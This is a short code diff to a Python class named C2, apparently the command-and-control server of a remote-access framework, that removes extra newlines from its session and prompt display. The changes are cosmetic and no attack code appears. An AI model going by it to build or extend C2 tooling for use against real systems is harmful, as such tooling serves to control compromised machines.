@@ -748,7 +748,7 @@ class C2():
                         util.display("    Session:", color='white', style='bright', end=',')
                         util.display(str(session.id), color='white', style='normal')
                         util.display("    Started:", color='white', style='bright', end=',')
-                        util.display(time.ctime(session._created) + "\n", color='white', style='normal')
+                        util.display(time.ctime(session._created), color='white', style='normal')
                         self._count += 1
                     else:
                         util.display("\n\n[+]", color='green', style='bright', end=',')
@@ -761,7 +761,7 @@ class C2():
                 util.display(address[0], color='white', style='normal')
 
             # refresh prompt
-            prompt = '\n\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
+            prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             sys.stdout.flush()
 
